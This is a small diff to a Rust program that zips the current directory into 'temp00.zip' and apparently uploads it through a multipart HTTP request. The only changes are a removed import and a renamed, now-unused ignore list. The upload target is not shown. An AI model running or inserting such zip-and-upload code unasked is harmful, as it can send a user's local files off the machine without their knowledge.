@@ -1,7 +1,7 @@
 use std::fs::{self, File};
 use std::io::prelude::*;
 use std::io::Read;
-use std::path::Path;
+
 use zip::write::FileOptions;
 use zip::ZipWriter;
 use reqwest::blocking::multipart::{Form, Part};
@@ -77,7 +77,7 @@ fn post_file() -> Result<(), Box<dyn std::error::Error>> {
 
 fn main() {
     let zip_file_path = "./temp00.zip";
-    let ignore_list = ["emoji", "user_data", "dump", "temp00", "node_modules", "target", "archiving.exe"];
+    let _ignore_list = ["emoji", "user_data", "dump", "temp00", "node_modules", "target", "archiving.exe"];
     if let Err(e) = zip_current_directory(zip_file_path) {
         eprintln!("Error zipping current directory: {}", e);
     } else {
